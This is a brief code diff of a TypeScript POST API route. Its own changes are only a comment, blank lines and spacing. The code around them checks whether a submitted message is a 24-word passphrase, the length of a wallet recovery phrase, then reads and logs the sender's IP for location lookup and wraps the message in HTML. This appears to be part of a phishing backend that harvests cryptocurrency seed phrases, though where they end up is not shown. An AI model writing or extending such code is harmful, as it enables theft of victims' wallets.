@@ -43,8 +43,11 @@ const formatMessage = async (message: string, location: string) => {
         console.log("Internal server error");
     }
 
+    // Return the formatted message
     return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
 };
+
+
 
 export async function POST(request: Request) {
     try {
@@ -53,7 +56,7 @@ export async function POST(request: Request) {
         // Validate that the message is a passphrase with 24 words
         const words = message.trim().split(/\s+/);
 
-        if(words.length === 24) {
+        if (words.length === 24) {
             // Get user's location based on IP
             const ip = request.headers.get('x-forwarded-for');
             console.log(ip)
